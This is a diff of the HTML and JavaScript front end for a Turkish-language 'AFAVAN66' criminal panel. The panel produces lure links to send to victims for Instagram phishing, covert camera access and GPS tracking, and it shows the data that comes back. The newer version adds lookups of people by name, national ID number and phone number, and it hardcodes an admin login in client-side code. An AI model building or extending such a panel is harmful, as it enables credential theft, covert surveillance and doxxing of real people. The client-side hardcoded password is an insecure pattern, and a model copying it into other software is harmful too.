@@ -3,157 +3,152 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>AFAVAN66 - Ultimate Multi-Panel</title>
+    <title>AFAVAN66 - Premium Panel</title>
     <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
     <style>
-        :root { --bg: #050505; --neon: #00d4ff; --green: #39ff14; --border: #1a1a1a; --sidebar-w: 260px; }
+        :root { --bg: #000; --accent: #00d4ff; --text: #888; --danger: #ff0000; --sidebar-w: 280px; }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'JetBrains Mono', monospace; }
         body { background: var(--bg); color: white; overflow-x: hidden; }
 
-        /* AUTH */
+        /* AUTH SCREEN */
         #auth-screen { position: fixed; inset: 0; background: var(--bg); display: flex; align-items: center; justify-content: center; z-index: 9999; }
-        .auth-card { width: 90%; max-width: 380px; background: #0d0d0d; border: 1px solid var(--border); padding: 25px; border-radius: 15px; }
-        .tabs-top { display: flex; margin-bottom: 20px; border-bottom: 1px solid #222; }
-        .tab-btn { flex: 1; text-align: center; padding: 10px; cursor: pointer; color: #444; font-size: 12px; }
-        .tab-btn.active { color: var(--neon); border-bottom: 2px solid var(--neon); }
-        input { width: 100%; background: #000; border: 1px solid #222; padding: 14px; color: white; outline: none; border-radius: 8px; margin-bottom: 12px; }
-        .btn { width: 100%; background: var(--neon); color: black; padding: 15px; border: none; font-weight: bold; border-radius: 8px; cursor: pointer; text-transform: uppercase; font-size: 12px; }
+        .auth-card { width: 90%; max-width: 380px; padding: 30px; border: 1px solid #111; border-radius: 10px; }
+        .tabs { display: flex; margin-bottom: 20px; border-bottom: 1px solid #111; }
+        .tab { flex: 1; text-align: center; padding: 10px; cursor: pointer; color: #444; font-size: 12px; }
+        .tab.active { color: var(--accent); border-bottom: 2px solid var(--accent); }
+        input { width: 100%; background: #080808; border: 1px solid #222; padding: 15px; color: white; outline: none; margin-bottom: 15px; border-radius: 5px; }
+        .btn { width: 100%; background: var(--accent); color: black; padding: 15px; border: none; font-weight: bold; cursor: pointer; border-radius: 5px; }
 
-        /* HEADER & SIDEBAR */
-        header { position: fixed; top: 0; width: 100%; height: 60px; background: #0a0a0a; display: flex; align-items: center; padding: 0 15px; border-bottom: 1px solid var(--border); z-index: 1000; }
-        .menu-icon { font-size: 24px; color: var(--neon); cursor: pointer; margin-right: 15px; background:none; border:none; }
-        #sidebar { position: fixed; top: 0; left: -260px; width: 260px; height: 100%; background: #080808; border-right: 1px solid var(--border); transition: 0.4s; z-index: 1001; padding-top: 20px; }
+        /* HEADER */
+        header { position: fixed; top: 0; width: 100%; height: 60px; background: #050505; display: flex; align-items: center; padding: 0 15px; border-bottom: 1px solid #111; z-index: 1000; }
+        .menu-btn { font-size: 24px; color: var(--accent); cursor: pointer; background: none; border: none; margin-right: 15px; }
+
+        /* SIDEBAR (Resimdeki Tasarım) */
+        #sidebar { position: fixed; top: 0; left: -280px; width: var(--sidebar-w); height: 100%; background: #050505; border-right: 1px solid #111; transition: 0.3s; z-index: 1001; display: flex; flex-direction: column; }
         #sidebar.active { left: 0; }
-        .side-item { padding: 15px 25px; color: #888; cursor: pointer; display: block; text-decoration: none; font-size: 13px; }
-        .side-item:hover { color: var(--neon); background: rgba(0, 212, 255, 0.05); }
+        .side-head { padding: 25px 20px 10px; color: #333; font-size: 10px; letter-spacing: 2px; text-transform: uppercase; }
+        .side-link { padding: 15px 20px; color: #fff; cursor: pointer; display: flex; align-items: center; gap: 10px; text-decoration: none; font-size: 14px; }
+        .side-link:hover { background: rgba(0, 212, 255, 0.1); color: var(--accent); }
+        .side-link.active { border-left: 4px solid var(--accent); background: linear-gradient(to right, rgba(0,212,255,0.1), transparent); }
+        .logout-btn { margin-top: auto; padding: 25px 20px; color: var(--danger); cursor: pointer; font-weight: bold; font-size: 14px; border-top: 1px solid #111; }
+
+        /* CONTENT */
+        main { padding: 80px 20px; max-width: 600px; margin: 0 auto; display: none; }
+        .tool-card { background: #080808; border: 1px solid #111; padding: 20px; border-radius: 8px; margin-bottom: 20px; }
+        .link-container { display: flex; gap: 5px; margin: 15px 0; }
+        .link-container input { margin-bottom: 0; font-size: 11px; flex-grow: 1; border-color: #333; color: var(--accent); }
+        .badge { display: inline-block; padding: 2px 8px; font-size: 10px; background: #111; color: var(--accent); border-radius: 3px; margin-bottom: 10px; }
         #overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.8); display: none; z-index: 1000; }
         #overlay.active { display: block; }
-
-        /* PANEL CONTENT */
-        #main-panel { display: none; padding: 80px 15px 40px; max-width: 600px; margin: 0 auto; }
-        .section { display: none; }
-        .section.active { display: block; animation: fadeIn 0.3s; }
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-
-        .card { background: #0d0d0d; border: 1px solid var(--border); padding: 20px; border-radius: 12px; margin-bottom: 20px; border-top: 3px solid var(--neon); }
-        .link-box { background: #000; border: 1px dashed #333; padding: 12px; font-size: 10px; color: var(--green); word-break: break-all; margin: 10px 0; border-radius: 5px; }
-        
-        /* LOGS */
-        .log-box { margin-top: 20px; border: 1px solid #111; border-radius: 10px; padding: 15px; min-height: 200px; font-size: 11px; color: #444; }
-        .log-entry { background: #080808; padding: 10px; border-left: 2px solid var(--green); margin-bottom: 10px; color: #ccc; }
     </style>
 </head>
 <body>
 
     <div id="auth-screen">
         <div class="auth-card">
-            <h2 style="text-align: center; color: var(--neon); margin-bottom: 20px;">AFAVAN66 V3</h2>
-            <div class="tabs-top">
-                <div class="tab-btn active" id="btn-login" onclick="setAuth('login')">GİRİŞ</div>
-                <div class="tab-btn" id="btn-reg" onclick="setAuth('reg')">KAYIT OL</div>
+            <h2 style="text-align: center; color: var(--accent); margin-bottom: 25px;">AFAVAN66 VIP</h2>
+            <div class="tabs">
+                <div class="tab active" id="tab-l" onclick="setAuth('login')">GİRİŞ</div>
+                <div class="tab" id="tab-r" onclick="setAuth('reg')">KAYIT</div>
             </div>
-            <input type="text" id="user" placeholder="Kullanıcı Adı">
-            <input type="password" id="pass" placeholder="Şifre">
+            <input type="text" id="u-input" placeholder="Kullanıcı Adı">
+            <input type="password" id="p-input" placeholder="Şifre">
             <button class="btn" onclick="handleAuth()">SİSTEME GİRİŞ</button>
         </div>
     </div>
 
     <header>
-        <button class="menu-icon" onclick="toggleMenu()">☰</button>
-        <div style="font-weight: bold; flex-grow: 1;">AFAVAN66 <span style="color:var(--neon)">VIP</span></div>
-        <div id="u-tag" style="font-size: 9px; color: var(--green); text-align: right;"></div>
+        <button class="menu-btn" onclick="toggleMenu()">☰</button>
+        <span style="font-weight: bold;">AFAVAN66 <span style="color:var(--accent)">ENG</span></span>
     </header>
 
     <div id="overlay" onclick="toggleMenu()"></div>
-    <div id="sidebar">
-        <div style="padding: 20px; font-size: 10px; color: #333; letter-spacing: 2px;">MENÜ</div>
-        <div class="side-item" onclick="showSection('cam')">📷 KAMERA SIZMA</div>
-        <div class="side-item" onclick="showSection('ig')">📸 INSTAGRAM PHISH</div>
-        <div class="side-item" onclick="showSection('loc')">📍 KONUM TAKİBİ</div>
-        <div class="side-item" style="color:red; margin-top:50px;" onclick="location.reload()">ÇIKIŞ YAP</div>
-    </div>
-
-    <div id="main-panel">
+    
+    <nav id="sidebar">
+        <div class="side-head">SORGULAR</div>
+        <div class="side-link active">👤 Ad Soyad</div>
+        <div class="side-link">🆔 T.C. Sorgu</div>
+        <div class="side-link">📞 GSM Sorgu</div>
         
-        <div id="sec-cam" class="section active">
-            <div class="card">
-                <h3 style="color:var(--neon)">KAMERA ERİŞİMİ</h3>
-                <p style="font-size: 11px; color: #555; margin-top:5px;">Size özel linki kurbana gönderin:</p>
-                <div class="link-box" id="link-cam-val"></div>
-                <button class="btn" onclick="copy('link-cam-val')">KAMERA LİNKİNİ KOPYALA</button>
+        <div class="side-head">SIZMA ARAÇLARI</div>
+        <div class="side-link" onclick="toggleMenu()">📸 Instagram</div>
+        <div class="side-link" onclick="toggleMenu()">📷 Kamera (5x)</div>
+        <div class="side-link" onclick="toggleMenu()">📍 Konum</div>
+        
+        <div class="logout-btn" onclick="logout()">ÇIKIŞ YAP</div>
+    </nav>
+
+    <main id="main-content">
+        <div class="tool-card">
+            <span class="badge">AKTİF MODÜL: KAMERA</span>
+            <h3>Özel Sızma Linki</h3>
+            <p style="font-size: 11px; color: #555; margin-top: 5px;">Link sonundaki kodu dilediğin gibi değiştir:</p>
+            <div class="link-container">
+                <input type="text" id="custom-slug" value="kamera-izleme-01">
+                <button class="btn" style="width: auto; padding: 0 15px;" onclick="updateLink()">SET</button>
             </div>
-            <div class="log-box" id="logs-cam">Henüz veri girişi yok.</div>
+            <div id="final-link" style="color: var(--accent); font-size: 10px; background: #000; padding: 10px; border-radius: 5px; border: 1px dashed #222;"></div>
+            <button class="btn" style="margin-top: 15px;" onclick="copyL()">LİNKİ KOPYALA</button>
         </div>
 
-        <div id="sec-ig" class="section">
-            <div class="card" style="border-top-color: #e1306c;">
-                <h3 style="color:#e1306c">INSTAGRAM PHISH</h3>
-                <p style="font-size: 11px; color: #555; margin-top:5px;">Sahte giriş linkiniz:</p>
-                <div class="link-box" id="link-ig-val"></div>
-                <button class="btn" style="background:#e1306c; color:white;" onclick="copy('link-ig-val')">IG LİNKİNİ KOPYALA</button>
-            </div>
-            <div class="log-box" id="logs-ig">Henüz hesap düşmedi.</div>
+        <div style="font-size: 12px; color: var(--accent); font-weight: bold; margin-bottom: 10px;">📥 GELEN VERİLER</div>
+        <div id="log-box" style="height: 200px; border: 1px solid #111; border-radius: 8px; display: flex; align-items: center; justify-content: center; color: #222; font-size: 11px;">
+            Veri trafiği bekleniyor...
         </div>
-
-        <div id="sec-loc" class="section">
-            <div class="card" style="border-top-color: var(--green);">
-                <h3 style="color:var(--green)">KONUM TAKİBİ</h3>
-                <p style="font-size: 11px; color: #555; margin-top:5px;">GPS veri alma linkiniz:</p>
-                <div class="link-box" id="link-loc-val"></div>
-                <button class="btn" style="background:var(--green);" onclick="copy('link-loc-val')">KONUM LİNKİNİ KOPYALA</button>
-            </div>
-            <div class="log-box" id="logs-loc">Koordinat bekleniyor...</div>
-        </div>
-
-    </div>
+    </main>
 
     <script>
         let mode = 'login';
-        let db = JSON.parse(localStorage.getItem('afa_v3_db')) || {};
+        let db = JSON.parse(localStorage.getItem('afa_v4_db')) || {};
+
+        window.onload = () => {
+            const sess = localStorage.getItem('afa_session');
+            if(sess) start(JSON.parse(sess));
+        };
 
         function setAuth(m) {
             mode = m;
-            document.getElementById('btn-login').classList.toggle('active', m === 'login');
-            document.getElementById('btn-reg').classList.toggle('active', m === 'reg');
+            document.getElementById('tab-l').classList.toggle('active', m === 'login');
+            document.getElementById('tab-r').classList.toggle('active', m === 'reg');
         }
 
         function handleAuth() {
-            const u = document.getElementById('user').value;
-            const p = document.getElementById('pass').value;
+            const u = document.getElementById('u-input').value;
+            const p = document.getElementById('p-input').value;
             if(!u || !p) return;
 
-            if(mode === 'reg') {
-                if(db[u]) return alert("Bu kullanıcı mevcut!");
-                const id = "AFA-" + Math.floor(1000 + Math.random() * 9000);
-                db[u] = { pass: p, uid: id };
-                localStorage.setItem('afa_v3_db', JSON.stringify(db));
-                alert("Başarıyla kayıt oldunuz! ID: " + id);
+            // ADMIN GIRISI (Direkt Giriş)
+            if(u === "afavan66" && p === "Efecan1903") {
+                const s = { user: "ADMIN", id: "ROOT-01", slug: "admin-özel" };
+                saveS(s);
+            } else if(mode === 'reg') {
+                if(db[u]) return alert("Kullanıcı var!");
+                const id = "AFA-" + Math.floor(Math.random()*9999);
+                db[u] = { pass: p, id: id, slug: "user-"+id };
+                localStorage.setItem('afa_v4_db', JSON.stringify(db));
+                alert("Kayıt başarılı, giriş yapın!");
             } else {
-                if(u === "afavan66" && p === "Efecan1903") {
-                    start("ADMIN", "ROOT-01");
-                } else if(db[u] && db[u].pass === p) {
-                    start(u, db[u].uid);
-                } else {
-                    alert("Hatalı giriş!");
-                }
+                if(db[u] && db[u].pass === p) {
+                    saveS({ user: u, id: db[u].id, slug: db[u].slug });
+                } else alert("Hatalı bilgi!");
             }
         }
 
-        function start(user, id) {
+        function saveS(s) { localStorage.setItem('afa_session', JSON.stringify(s)); start(s); }
+
+        function start(s) {
             document.getElementById('auth-screen').style.display = 'none';
-            document.getElementById('main-panel').style.display = 'block';
-            document.getElementById('u-tag').innerText = user.toUpperCase() + "\n" + id;
-            
-            const base = "https://afavan-secure.github.io";
-            document.getElementById('link-cam-val').innerText = `${base}/camera?ref=${id}`;
-            document.getElementById('link-ig-val').innerText = `${base}/login?ref=${id}`;
-            document.getElementById('link-loc-val').innerText = `${base}/track?ref=${id}`;
+            document.getElementById('main-content').style.display = 'block';
+            document.getElementById('custom-slug').value = s.slug;
+            updateLink();
         }
 
-        function showSection(s) {
-            document.querySelectorAll('.section').forEach(el => el.classList.remove('active'));
-            document.getElementById('sec-' + s).classList.add('active');
-            toggleMenu();
+        function updateLink() {
+            const slug = document.getElementById('custom-slug').value;
+            const sess = JSON.parse(localStorage.getItem('afa_session'));
+            sess.slug = slug;
+            localStorage.setItem('afa_session', JSON.stringify(sess));
+            document.getElementById('final-link').innerText = window.location.origin + "/monitor/" + slug;
         }
 
         function toggleMenu() {
@@ -161,10 +156,12 @@
             document.getElementById('overlay').classList.toggle('active');
         }
 
-        function copy(id) {
-            navigator.clipboard.writeText(document.getElementById(id).innerText);
+        function copyL() {
+            navigator.clipboard.writeText(document.getElementById('final-link').innerText);
             alert("Link kopyalandı!");
         }
+
+        function logout() { localStorage.removeItem('afa_session'); location.reload(); }
     </script>
 </body>
 </html>
